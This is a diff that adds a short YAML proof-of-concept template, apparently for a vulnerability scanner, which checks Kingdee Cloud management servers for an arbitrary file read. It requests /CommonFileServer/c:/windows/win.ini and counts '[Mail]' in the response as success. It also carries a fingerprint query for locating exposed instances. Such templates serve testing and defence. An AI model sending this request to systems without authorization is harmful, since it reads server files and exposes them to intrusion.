@@ -1,0 +1,11 @@
+name: poc-yaml-kingdee-cloud-readfile
+rules:
+  - method: GET
+    path: /CommonFileServer/c:/windows/win.ini
+    expression: |
+      response.status == 200 && response.body.bcontains(b"[Mail]")
+detail:
+  author: kingdee-cloud-readfile
+  links:
+    - https://www.baidu.com
+    - app="金蝶云星空-管理中心"
